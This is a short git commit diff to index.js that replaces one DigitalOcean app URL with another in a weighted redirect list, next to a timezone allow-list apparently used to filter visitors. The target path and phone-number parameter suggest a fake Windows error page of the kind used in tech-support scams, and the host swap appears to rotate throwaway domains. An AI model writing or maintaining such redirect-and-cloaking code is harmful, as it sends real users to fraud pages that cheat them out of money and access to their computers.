d1591ae2c6c0f20a6ab9a61c9a4d97ff16293fd6
paalakash <palaksh452@gmail.com>
2026-06-08 06:50:40 +0530

    Update RAW_CONFIGS URL in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://orca-app-ppfrf.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3710", weight: 1.0 }
+    { url: "https://stingray-app-2-p4xnq.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3710", weight: 1.0 }
 
 ];
 
